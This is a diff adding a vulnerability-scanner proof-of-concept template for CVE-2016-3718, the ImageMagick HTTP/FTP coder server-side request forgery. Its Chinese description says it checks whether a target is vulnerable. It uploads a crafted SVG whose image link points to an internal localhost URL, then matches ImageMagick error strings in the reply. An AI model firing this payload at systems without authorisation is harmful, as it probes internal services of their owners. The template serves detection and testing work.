@@ -1,0 +1,42 @@
+[info]
+author = "ave"
+description = "通过构造恶意SVG图片文件，利用ImageMagick的HTTP/FTP编码器发起SSRF请求，检测目标是否存在该漏洞"
+id = "POC-AVE-2016-0400"
+name = "ImageMagick HTTP/FTP Coder SSRF PoC"
+severity = "medium"
+tags = ["ave-2016-0400"]
+vuln_id = [
+    "CVE-2016-3718",
+    "AVE-2016-0400",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/upload"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg width="800px" height="800px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+  <image xlink:href="http://127.0.0.1:8080/internal" width="800" height="800"/>
+</svg>"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "image/svg+xml"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "error",
+    "Exception",
+    "MagickCore",
+    "unable to open image",
+]
